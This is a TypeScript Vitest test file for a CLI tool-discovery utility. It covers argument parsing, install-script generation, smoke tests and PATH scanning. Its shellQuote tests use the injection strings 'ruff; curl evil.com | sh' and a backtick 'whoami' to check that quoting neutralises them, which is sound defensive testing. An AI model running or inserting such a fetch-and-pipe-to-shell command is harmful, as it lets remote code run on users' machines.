/**
 * Tests for pure functions in examples/skill-forge.ts
 */
import { describe, it, expect, beforeEach, afterEach } from "vitest";
import {
  parseArgs,
  fmtTable,
  toolToManifestEntry,

} from "../examples/skill-forge.js";
import { smokeTest } from "../examples/forge/stages.js";
import { discoverPathBinaries } from "../examples/forge/mode-system.js";
import { generateInstallScript, shellQuote } from "../lib/skills.js";
import { GENERAL_TOOLS } from "../lib/curated-tools.js";
import type { Tool, ToolCommand } from "../lib/types.js";
import { mkdtempSync, writeFileSync, chmodSync, rmSync } from "node:fs";
import { join } from "node:path";
import { tmpdir } from "node:os";

// ── parseArgs ──────────────────────────────────────────────────────────

describe("parseArgs", () => {
  let originalArgv: string[];

  beforeEach(() => { originalArgv = process.argv; });
  afterEach(() => { process.argv = originalArgv; });

  it("parses --tool flag", () => {
    process.argv = ["node", "script", "--tool", "pypi:ruff"];
    const args = parseArgs();
    expect(args.tool).toBe("pypi:ruff");
    expect(args.prompt).toBe("");
  });

  it("parses --deep, --dry-run, --json, --strict flags", () => {
    process.argv = ["node", "script", "--deep", "--dry-run", "--json", "--strict", "--tool", "ruff"];
    const args = parseArgs();
    expect(args.deep).toBe(true);
    expect(args.dryRun).toBe(true);
    expect(args.json).toBe(true);
    expect(args.strict).toBe(true);
  });

  it("parses --limit with valid number", () => {
    process.argv = ["node", "script", "--limit", "25"];
    const args = parseArgs();
    expect(args.limit).toBe(25);
  });

  it("rejects --limit with NaN", () => {
    process.argv = ["node", "script", "--limit", "abc"];
    expect(() => parseArgs()).toThrow("Invalid --limit value");
  });

  it("rejects --limit with negative value", () => {
    process.argv = ["node", "script", "--limit", "-5"];
    expect(() => parseArgs()).toThrow("Invalid --limit value");
  });

  it("collects remaining args as prompt", () => {
    process.argv = ["node", "script", "build", "a", "RAG", "pipeline"];
    const args = parseArgs();
    expect(args.prompt).toBe("build a RAG pipeline");
  });

  it("defaults are correct", () => {
    process.argv = ["node", "script"];
    const args = parseArgs();
    expect(args.limit).toBe(10);
    expect(args.deep).toBe(false);
    expect(args.audit).toBe(false);
    expect(args.dryRun).toBe(false);
    expect(args.json).toBe(false);
    expect(args.strict).toBe(false);
  });
});

// ── shellQuote ─────────────────────────────────────────────────────────

describe("shellQuote", () => {
  it("wraps simple string in single quotes", () => {
    expect(shellQuote("ruff")).toBe("'ruff'");
  });

  it("escapes embedded single quotes", () => {
    expect(shellQuote("it's")).toBe("'it'\\''s'");
  });

  it("neutralizes shell metacharacters", () => {
    const malicious = "ruff; curl evil.com | sh";
    const quoted = shellQuote(malicious);
    expect(quoted).toBe("'ruff; curl evil.com | sh'");
    // The result is a safe single-quoted string
    expect(quoted).not.toContain("$(");
  });

  it("handles backtick injection", () => {
    const quoted = shellQuote("`whoami`");
    expect(quoted).toBe("'`whoami`'");
  });
});

// ── fmtTable ───────────────────────────────────────────────────────────

describe("fmtTable", () => {
  it("formats a simple table", () => {
    const result = fmtTable([["a", "b"], ["cc", "dd"]], ["H1", "H2"]);
    expect(result).toContain("H1");
    expect(result).toContain("H2");
    expect(result).toContain("a");
    expect(result).toContain("dd");
  });

  it("handles empty rows", () => {
    const result = fmtTable([], ["Col"]);
    expect(result).toContain("Col");
    // Should still produce a valid table structure
    expect(result).toContain("┌");
    expect(result).toContain("└");
  });
});

// ── toolToManifestEntry ────────────────────────────────────────────────

function makeTool(overrides: Partial<Tool> = {}): Tool {
  return {
    meta: { name: "test-tool", version: "1.0.0", description: "A test tool", tags: ["test"] },
    source: { format: "pypi", uri: "pypi:test-tool" },
    capabilities: { commands: [], globalFlags: [] },
    ...overrides,
  } as Tool;
}

describe("toolToManifestEntry", () => {
  it("returns a ManifestEntry with correct name", () => {
    const entry = toolToManifestEntry(makeTool());
    expect(entry).not.toBeNull();
    expect(entry!.name).toBe("test-tool");
  });

  it("uses tool name (not URI) as repo for non-GitHub sources", () => {
    const entry = toolToManifestEntry(makeTool({
      source: { format: "pypi", uri: "pypi:ruff" },
    } as Partial<Tool>));
    expect(entry!.repo).toBe("test-tool");  // Not "pypi:ruff"
  });

  it("uses URI as repo for GitHub sources", () => {
    const entry = toolToManifestEntry(makeTool({
      source: { format: "github", uri: "astral-sh/ruff" },
    } as Partial<Tool>));
    expect(entry!.repo).toBe("astral-sh/ruff");
  });
});

// ── generateInstallScript ──────────────────────────────────────────────

describe("generateInstallScript", () => {
  it("generates npm install script for npm tools", () => {
    const script = generateInstallScript(makeTool({
      source: { format: "npm", uri: "npm:express" },
    } as Partial<Tool>));
    expect(script).toContain("npm install -g");
    expect(script).toContain("set -euo pipefail");
  });

  it("generates uv install script for pypi tools", () => {
    const script = generateInstallScript(makeTool({
      source: { format: "pypi", uri: "pypi:ruff" },
    } as Partial<Tool>));
    expect(script).toContain("uv tool install");
  });

  it("generates cargo install script for crates tools", () => {
    const script = generateInstallScript(makeTool({
      source: { format: "crates", uri: "crates:ripgrep" },
    } as Partial<Tool>));
    expect(script).toContain("cargo binstall");
  });

  it("shell-quotes package names to prevent injection", () => {
    // validateToolName will reject truly malicious names,
    // but shellQuote adds defense-in-depth
    const script = generateInstallScript(makeTool({
      source: { format: "pypi", uri: "pypi:safe-name" },
    } as Partial<Tool>));
    expect(script).toContain("'safe-name'");
  });
});

// ── smokeTest ──────────────────────────────────────────────────────────

describe("smokeTest", () => {
  let tmpDir: string;

  beforeEach(() => {
    tmpDir = mkdtempSync(join(tmpdir(), "agents-cli-smoke-"));
  });

  afterEach(() => {
    rmSync(tmpDir, { recursive: true, force: true });
  });

  it("detects --version and --help on responsive binary", () => {
    const script = join(tmpDir, "good-tool");
    // probeWithArgs/probeHelp requires output > 20 chars
    writeFileSync(script, `#!/bin/bash
case "$1" in
  --version) echo "good-tool version 1.0.0 (stable release)";;
  --help|-h|help) echo "Usage: good-tool [options] -- a useful CLI tool for testing";;
esac
`);
    chmodSync(script, 0o755);

    const tool = makeTool();
    const result = smokeTest(tool, "/nonexistent", script);
    expect(result.versionOk).toBe(true);
    expect(result.helpOk).toBe(true);
  });

  it("verifies subcommands respond to --help", () => {
    const script = join(tmpDir, "sub-tool");
    // probeWithArgs calls: bin <cmd> --help, bin <cmd> -h, bin <cmd> help
    // The script needs to respond to at least one of those combinations
    writeFileSync(script, `#!/bin/bash
case "$1" in
  --version) echo "sub-tool version 1.0.0";;
  --help|-h|help) echo "Usage: sub-tool [command] -- a sub-tool";;
  build)
    case "$2" in
      --help|-h|help) echo "Build the project with sub-tool";;
    esac;;
  test)
    case "$2" in
      --help|-h|help) echo "Run the test suite for sub-tool";;
    esac;;
esac
`);
    chmodSync(script, 0o755);

    const cmds: ToolCommand[] = [
      { name: "build", description: "Build", flags: [] },
      { name: "test", description: "Test", flags: [] },
    ];
    const tool = makeTool({
      capabilities: { commands: cmds, globalFlags: [], analysisMethod: "flag-parse" },
    } as Partial<Tool>);

    const result = smokeTest(tool, "/nonexistent", script);
    expect(result.commandsVerified).toBe(2);
    expect(result.commandsFailed).toBe(0);
  });

  it("returns helpOk=true but versionOk=false when binary lacks --version", () => {
    const script = join(tmpDir, "help-only");
    writeFileSync(script, `#!/bin/bash
case "$1" in
  --help|-h|help) echo "Usage: help-only [options] -- a CLI with no version flag";;
esac
`);
    chmodSync(script, 0o755);

    const tool = makeTool();
    const result = smokeTest(tool, "/nonexistent", script);
    expect(result.helpOk).toBe(true);
    expect(result.versionOk).toBe(false);
  });

  it("returns all false when binary not found", () => {
    const tool = makeTool();
    const result = smokeTest(tool, "/nonexistent-dir");
    expect(result.versionOk).toBe(false);
    expect(result.helpOk).toBe(false);
    expect(result.commandsVerified).toBe(0);
  });

  it("skips nested commands (with spaces in name)", () => {
    const script = join(tmpDir, "nested-tool");
    writeFileSync(script, `#!/bin/bash
echo "help"
`);
    chmodSync(script, 0o755);

    const cmds: ToolCommand[] = [
      { name: "sub cmd", description: "Nested", flags: [] },
    ];
    const tool = makeTool({
      capabilities: { commands: cmds, globalFlags: [], analysisMethod: "flag-parse" },
    } as Partial<Tool>);

    const result = smokeTest(tool, "/nonexistent", script);
    // Nested command skipped, so 0 verified and 0 failed
    expect(result.commandsVerified).toBe(0);
    expect(result.commandsFailed).toBe(0);
  });
});

// ── Curated tools: PyPI sourceType ─────────────────────────────────────

describe("curated tools: gui-wrapper sourceTypes", () => {
  it("gui-wrapper entries are local (aspirational pypi entries are commented out)", () => {
    const guiWrappers = GENERAL_TOOLS.filter(t => t.category === "gui-wrappers");
    expect(guiWrappers.length).toBeGreaterThanOrEqual(1);
    for (const t of guiWrappers) {
      expect(["pypi", "local"]).toContain(t.sourceType);
    }
  });

  it("gui-wrapper source fields do not contain pypi: prefix", () => {
    const guiWrappers = GENERAL_TOOLS.filter(t => t.category === "gui-wrappers");
    for (const t of guiWrappers) {
      expect(t.source).not.toMatch(/^pypi:/);
    }
  });

  it("local gui-wrappers pass source through as-is", () => {
    const guiWrappers = GENERAL_TOOLS.filter(t => t.category === "gui-wrappers");
    for (const t of guiWrappers) {
      if (t.sourceType === "local") {
        expect(t.source).toMatch(/^\.\//);
      }
    }
  });

  it("cli-anything-gimp is a local tool pointing to examples dir", () => {
    const gimp = GENERAL_TOOLS.find(t => t.name === "cli-anything-gimp");
    expect(gimp).toBeDefined();
    expect(gimp!.sourceType).toBe("local");
    expect(gimp!.source).toBe("./examples/cli-anything-gimp");
  });

  it("all existing non-gui tools still use github or npm sourceType", () => {
    const nonGui = GENERAL_TOOLS.filter(t => t.category !== "gui-wrappers");
    for (const t of nonGui) {
      expect(["github", "npm"]).toContain(t.sourceType);
    }
  });
});

// ── parseArgs: --system flag ───────────────────────────────────────────

describe("parseArgs --system", () => {
  let originalArgv: string[];

  beforeEach(() => { originalArgv = process.argv; });
  afterEach(() => { process.argv = originalArgv; });

  it("parses --system flag", () => {
    process.argv = ["node", "script", "--system"];
    const args = parseArgs();
    expect(args.system).toBe(true);
  });

  it("defaults system to false", () => {
    process.argv = ["node", "script"];
    const args = parseArgs();
    expect(args.system).toBe(false);
  });
});

// ── discoverPathBinaries (mode-system.ts) ──────────────────────────────

describe("discoverPathBinaries", () => {
  let tmpDir: string;
  let originalPath: string | undefined;

  beforeEach(() => {
    tmpDir = mkdtempSync(join(tmpdir(), "agents-cli-path-"));
    originalPath = process.env["PATH"];
  });

  afterEach(() => {
    process.env["PATH"] = originalPath;
    rmSync(tmpDir, { recursive: true, force: true });
  });

  it("discovers executables from a temp PATH dir", () => {
    const script = join(tmpDir, "my-cli-tool");
    writeFileSync(script, "#!/bin/bash\necho hello");
    chmodSync(script, 0o755);
    process.env["PATH"] = tmpDir;

    const results = discoverPathBinaries(10);
    expect(results.some(r => r.name === "my-cli-tool")).toBe(true);
  });

  it("skips known system builtins", () => {
    for (const name of ["bash", "ls", "grep", "cat"]) {
      const script = join(tmpDir, name);
      writeFileSync(script, "#!/bin/bash\necho hello");
      chmodSync(script, 0o755);
    }
    process.env["PATH"] = tmpDir;

    const results = discoverPathBinaries(100);
    const names = results.map(r => r.name);
    expect(names).not.toContain("bash");
    expect(names).not.toContain("ls");
    expect(names).not.toContain("grep");
    expect(names).not.toContain("cat");
  });

  it("skips dotfiles and script extensions", () => {
    writeFileSync(join(tmpDir, ".hidden"), "#!/bin/bash\necho"); chmodSync(join(tmpDir, ".hidden"), 0o755);
    writeFileSync(join(tmpDir, "helper.sh"), "#!/bin/bash\necho"); chmodSync(join(tmpDir, "helper.sh"), 0o755);
    writeFileSync(join(tmpDir, "tool.py"), "#!/usr/bin/env python3"); chmodSync(join(tmpDir, "tool.py"), 0o755);
    process.env["PATH"] = tmpDir;

    const results = discoverPathBinaries(100);
    const names = results.map(r => r.name);
    expect(names).not.toContain(".hidden");
    expect(names).not.toContain("helper.sh");
    expect(names).not.toContain("tool.py");
  });

  it("respects limit cap", () => {
    for (let i = 0; i < 20; i++) {
      const script = join(tmpDir, `tool-${String(i).padStart(2, "0")}`);
      writeFileSync(script, "#!/bin/bash\necho hello");
      chmodSync(script, 0o755);
    }
    process.env["PATH"] = tmpDir;

    // limit=3 → cap=15, but only 20 binaries exist, and we check responsive count later
    const results = discoverPathBinaries(3);
    // discoverPathBinaries collects up to limit*5 candidates
    expect(results.length).toBeLessThanOrEqual(15);
    expect(results.length).toBeGreaterThan(0);
  });
});
